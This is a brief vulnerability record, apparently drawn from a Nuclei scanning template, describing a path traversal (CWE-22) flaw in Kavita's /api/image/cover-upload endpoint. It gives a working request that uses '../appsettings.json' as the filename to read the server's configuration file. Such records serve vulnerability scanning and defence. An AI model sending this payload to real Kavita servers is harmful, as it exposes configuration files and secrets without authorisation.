# Vulnerability: Kavita - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`kavita-lfi.yaml`)

## Description
Kavita - Path Traversal is vulnerable to local file inclusion via abusing the Path Traversal filename parameter of the /api/image/cover-upload.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/image/cover-upload?filename=../appsettings.json
```

